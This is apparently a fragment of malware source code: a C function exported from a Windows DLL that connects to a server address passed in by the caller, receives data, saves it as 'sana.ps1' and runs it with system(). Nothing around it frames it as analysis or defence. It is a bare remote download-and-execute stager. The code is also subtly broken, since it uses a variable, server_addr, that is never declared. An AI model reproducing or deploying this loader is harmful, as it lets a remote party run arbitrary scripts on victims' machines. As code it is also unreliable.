__declspec(dllexport) int connect_to_server_and_execute_file(const char* server_address, int server_port) {
            // Create a socket
            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                perror("socket");
                return 1;
            }
        
                server_addr.sin_family = AF_INET;
                server_addr.sin_port = htons(server_port);
                if (inet_pton(AF_INET, server_address, &server_addr.sin_addr) <= 0) {
                    perror("inet_pton");
                    return 1;
                }
        
            if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
                perror("connect");
                return 1;
            }
        
            char buffer[1024];
            memset(buffer, 0, sizeof(buffer));
            int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes_received == SOCKET_ERROR) {
                perror("recv");
                return 1;
            }
        
            FILE *file = fopen("sana.ps1", "w");
            if (file == NULL) {
                perror("fopen");
                return 1;
            }
            fwrite(buffer, 1, bytes_received, file);
            fclose(file);
        
            system("sana.ps1");
        
            closesocket(sock);
        
            return 0;
        }
